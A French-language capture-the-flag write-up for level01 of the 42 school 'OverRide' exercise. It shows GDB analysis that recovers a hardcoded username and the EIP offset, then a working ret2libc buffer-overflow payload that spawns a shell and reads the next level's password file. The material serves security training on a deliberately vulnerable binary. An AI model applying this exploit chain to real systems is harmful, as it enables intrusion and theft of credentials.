# Override
Override 42 security lvl 1

```
objdump -M intel -d level01
```

On observe un main et 2 fonctions : verify_user_pass ainsi que verify_user_name.
On transforme l'assembleur en code plus lisible, en C.

Exemple afin de récupérer les valeurs que l'on utilise dans le script C:
```
# Oui c'est très long et penible, je débute en débug GDB :3

gdb ./level01
b verify_user_name
r
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: test

disass

b *0x0804848d
Breakpoint 2 at 0x804848d

continue

info registers

x/s $eax
x/s $edx
```

Dans le cas montré au dessus. On s'interesse au strncmp que fait la fonction verify_user_name.
On observe donc que ce qui est comparé est la valeur que j'ai rentré sur stdin ainsi que le mot "dat_wil".

On essaie de se log avec dat_wil comme username, ca marche en revanche le mot de passe "admin" ne marche pas.

On va donc essayer de faire overflow le mot de passe.

```
# https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
python -c 'print "dat_wil\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"' > /tmp/lvl01
(gdb) r < /tmp/lvl01
Starting program: /home/users/level01/level01 < /tmp/lvl01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) 80
```
On trouve donc l'eip qui est à l'offset 80.
On a aucun appel systeme, on en deduis donc qu'il faut reussir à appeller notre shell.
On utilise ici une attaque nommée ret2libc.
L'idée est d'au lieu comme j'avais fait dans rainfall et d'appeler un shell, on va utiliser le shell system qui est present dans le programme.


```
# trouvons l'adresse du system
gdb ./level01
b * main
p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

# Trouvons l'adresse de /bin/sh
(gdb) info proc map
process 2205
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
	 0x804b000  0x806c000    0x21000        0x0 [heap]
	0xf7e2b000 0xf7e2c000     0x1000        0x0
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0
	0xf7fda000 0xf7fdb000     0x1000        0x0
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.

# Enfin une adress de retour
gdb ./level01
disass main
   0x080485b5 <+229>:	ret
```

Donc cela donne:
script de la forme : ([login] ; [Padding]) ; [system] ; [retour] ; [bin sh]

```
level01@OverRide:~$ (python -c 'print "dat_wil" + "\x0a" + "A"*80 + "\xd0\xae\xe6\xf7" + "\xb5\x85\x04\x08" + "\xec\x97\xf8\xf7" + "\x0a"' ; cat ) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
